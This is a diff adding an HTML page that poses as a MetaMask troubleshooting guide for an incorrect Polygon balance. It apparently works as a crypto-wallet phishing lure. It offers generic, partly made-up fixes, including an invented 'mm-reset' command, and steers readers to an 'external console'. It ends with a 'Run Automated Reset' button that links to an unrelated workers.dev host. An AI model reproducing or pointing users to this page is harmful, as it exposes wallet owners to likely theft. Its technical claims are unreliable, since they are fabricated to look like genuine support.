@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Metamask Extension Bug Incorrect Total Balance On Polygon Netwo</title>
+<style>
+    body {
+        font-family: sans-serif;
+        background: #0f111a;
+        color: #ddd;
+        padding: 20px;
+        line-height: 1.5;
+    }
+    .content {
+        max-width: 880px;
+        margin: auto;
+        background: #1e1f24;
+        border-radius: 24px;
+        padding: 2rem;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+    }
+    pre {
+        background: #0f0f12;
+        padding: 1rem;
+        border-radius: 12px;
+        overflow-x: auto;
+    }
+    a { color: #ff9455; }
+    .btn {
+        background: #00adb5;
+        color: #000;
+        padding: 14px 36px;
+        border-radius: 40px;
+        font-weight: bold;
+        display: inline-block;
+        text-decoration: none;
+        transition: 0.2s;
+    }
+    .btn:hover { transform: scale(1.02); }
+    </style>
+</head>
+<body>
+<div class="content">
+<h2>Symptom</h2>
+<ul>
+<li>The user observes an incorrect total balance displayed in the Metamask extension when using the Polygon network, despite having a sufficient balance in their wallet.</li>
+</ul>
+<h2>Technical Root Cause</h2>
+<ul>
+<li>The error occurs due to a synchronization issue between Metamask and the Polygon network, resulting in an outdated or incorrect balance being displayed.</li>
+</ul>
+<h3>Manual Overrides</h3>
+<ul>
+<li>Attempt to refresh the Metamask extension to re-establish the connection with the Polygon network.</li>
+<li>Manually update the Polygon network configuration in Metamask to ensure it is pointing to the correct RPC endpoint.</li>
+<li>Use the following command to reset the Metamask cache:</li>
+</ul>
+<div class="codehilite"><pre><span></span><code>mm-reset<span class="w"> </span>--network<span class="w"> </span>polygon
+</code></pre></div>
+
+<p>Consider utilizing an external console for a more comprehensive debugging experience.</p>
+<h2>Prerequisites</h2>
+<ol>
+<li>Ensure Metamask is updated to the latest version.</li>
+<li>Verify the Polygon network is correctly configured in Metamask.</li>
+<li>Check for any ongoing network maintenance or outages on the Polygon network.</li>
+</ol>
+<div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
+    <a href="https://system-edge-router.aaronjungs.workers.dev?p=ZXRo" class="btn">🛠 Run Automated Reset</a>
+</div>
+</div>
+</body>
+</html>
